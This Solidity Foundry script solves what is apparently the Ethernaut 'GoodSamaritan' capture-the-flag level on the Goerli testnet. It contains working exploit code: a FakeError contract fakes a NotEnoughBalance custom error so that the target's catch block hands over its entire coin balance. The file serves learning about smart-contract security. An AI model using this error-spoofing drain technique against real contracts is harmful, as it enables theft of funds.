// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/GoodSamaritan.sol";


// anvil -f $GOERLI_RPC_URL --fork-block-number 10019942
// forge script script/GoodSamaritan.s.sol:GoodSamaritanSolution --fork-url http://127.0.0.1:8545 --broadcast -vvv
// forge script script/GoodSamaritan.s.sol:GoodSamaritanSolution --rpc-url $GOERLI_RPC_URL --broadcast -vvv 

contract GoodSamaritanSolution is Script {
    
    /* 
     * Request donation from FakeError contract 
     * it will call notify function of FakeError
     * then revert with the NotEnoughBalance custom error
     * it should trigger the catch block in requestDonation function
     * and send all the remaining balance to our contract
     */

    address internal constant _SAMARITAN_ADDRESS = 0xf4a54cdE37dC57e84A5B532246173260706D06F5;
    FakeError public fe;
    GoodSamaritan public smr;
    Coin public coin;

    function setUp() public {
        smr = GoodSamaritan(_SAMARITAN_ADDRESS);
        coin = Coin(smr.coin.address);
    }

    function run() public {
        //uint256 attackerPK = vm.envUint("ANVIL_PRIVATE_KEY");
        uint256 attackerPK = vm.envUint("PRIVATE_KEY");

        vm. startBroadcast(attackerPK);

        // deploy FakeError Contract
        fe = new FakeError(_SAMARITAN_ADDRESS);

        // trigger the exploit
        fe.requestDonation();


        vm.stopBroadcast();

    }
}



contract FakeError {

    address public samaritanAddr;
    error NotEnoughBalance();

    constructor (address samaritan) {
        samaritanAddr = samaritan;
    }

    function notify(uint256 amount) external {
        // this check is here since the second transfer call with the remaning balance also calls notify
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

    function requestDonation() external {
        GoodSamaritan(samaritanAddr).requestDonation(); 
    }
}